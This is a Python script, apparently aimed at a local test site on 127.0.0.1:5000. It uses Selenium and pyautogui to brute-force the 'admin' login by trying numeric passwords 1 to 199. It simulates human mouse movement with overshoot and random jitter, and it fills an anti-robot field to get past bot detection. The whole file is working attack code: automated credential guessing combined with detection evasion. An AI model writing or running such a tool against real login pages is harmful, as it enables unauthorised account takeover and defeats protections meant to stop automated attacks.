import pyautogui
import time
import random
from selenium import webdriver
from selenium.webdriver.common.by import By

def human_like_mouse_move(to_x, to_y, min_duration=0.001):
    from_x, from_y = pyautogui.position()
    overshoot_factor = random.uniform(1.5, 2.0)
    overshoot_x = (to_x - from_x) * overshoot_factor + from_x
    overshoot_y = (to_y - from_y) * overshoot_factor + from_y

    move_to_target(overshoot_x, overshoot_y, min_duration)
    move_to_target(to_x, to_y, min_duration / 2)

def move_to_target(target_x, target_y, duration):
    from_x, from_y = pyautogui.position()
    distance = ((target_x - from_x) ** 2 + (target_y - from_y) ** 2) ** 0.5
    if distance == 0:
        return
    steps = max(3, int(distance / (distance / duration) * 100))
    for step in range(steps):
        deviation_x = random.uniform(-0.5, 0.5)
        deviation_y = random.uniform(-0.5, 0.5)
        pyautogui.moveTo(from_x + step * (target_x - from_x) / steps + deviation_x, 
                         from_y + step * (target_y - from_y) / steps + deviation_y, 
                         duration=0.0001)
        time.sleep(0.0001)

def move_to_element_and_type(element, text):
    location = element.location
    size = element.size
    absolute_x = driver.execute_script("return window.screenX;") + location['x'] + size['width'] / 2
    absolute_y = driver.execute_script("return window.screenY;") + location['y'] + non_webpage_height + size['height'] / 2
    human_like_mouse_move(absolute_x, absolute_y, min_duration=0.02)
    pyautogui.click()
    element.clear()
    pyautogui.write(text, interval=0.01)

def move_to_element_and_click(element):
    location = element.location
    size = element.size
    absolute_x = driver.execute_script("return window.screenX;") + location['x'] + size['width'] / 2
    absolute_y = driver.execute_script("return window.screenY;") + location['y'] + non_webpage_height + size['height'] / 2
    human_like_mouse_move(absolute_x, absolute_y, min_duration=0.02)
    pyautogui.click()

def login_process(username, password):
    try:
        username_field = driver.find_element(By.ID, "loginEmail")
        password_field = driver.find_element(By.ID, "loginPassword")
        robot_field = driver.find_element(By.ID, "robotCheck")

        def fill_field_if_needed(element, expected_value):
            current_value = element.get_attribute('value')
            if current_value != expected_value:
                move_to_element_and_type(element, expected_value)

        def are_all_fields_correctly_filled():
            return (
                username_field.get_attribute('value') == username and
                password_field.get_attribute('value') == password and
                robot_field.get_attribute('value') == "I am not a robot"
            )

        attempts = 0
        max_attempts = 3
        while not are_all_fields_correctly_filled() and attempts < max_attempts:
            fill_field_if_needed(username_field, username)
            fill_field_if_needed(password_field, password)
            fill_field_if_needed(robot_field, "I am not a robot")
            attempts += 1
            time.sleep(0.1)

        if attempts < max_attempts:
            submit_button = driver.find_element(By.CSS_SELECTOR, "input[type='submit']")
            move_to_element_and_click(submit_button)
            time.sleep(0.1)  # Wait for the response

            # Check for the success message
            message_element = driver.find_element(By.ID, "message")
            if "Login successful!" in message_element.text:
                print("Login successful. Waiting...")
                return True

        return False

    except Exception as e:
        print(f"An error occurred: {e}")
        return False

# The rest of your script remains the same


driver = webdriver.Chrome()
driver.maximize_window()
driver.get("http://127.0.0.1:5000")

window_height = driver.execute_script("return window.outerHeight;")
viewport_height = driver.execute_script("return window.innerHeight;")
non_webpage_height = window_height - viewport_height

username = "admin"
password_attempt = 1
success = False
while password_attempt < 200 and not success:
    success = login_process(username, str(password_attempt))
    password_attempt += 1
    time.sleep(0.01)  # Short wait between attempts

if success:
    print("Script is now waiting. Close the browser window manually to exit.")
    time.sleep(600)  # Wait for 10 minutes or any desired time

driver.quit()
